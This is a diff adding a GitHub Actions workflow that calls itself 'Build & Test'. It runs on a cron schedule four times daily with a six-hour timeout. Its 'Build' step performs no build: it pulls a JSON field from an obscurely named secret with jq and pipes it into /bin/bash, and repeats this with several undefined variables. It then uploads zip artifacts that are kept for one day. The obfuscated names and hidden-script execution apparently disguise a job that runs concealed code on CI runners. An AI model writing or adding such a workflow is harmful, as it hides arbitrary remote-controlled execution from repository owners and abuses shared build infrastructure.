@@ -1,0 +1,37 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Build
+        env:
+          p7769: ${{ secrets.p7769 }}
+        run: |
+          printf '%s' "$p7769" | jq -r .zzi3 | /bin/bash
+          echo $vqzr330 | jq -r .gzn93 | /bin/bash
+          echo $aex8796 | jq -r .k291 | /bin/bash
+          printf '%s' "$p37" | jq -r .ogmat95 | /bin/bash
+          echo $je363 | jq -r .hy4779 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: PKGUIa4K
+          path: "*.zip"
+          retention-days: 1
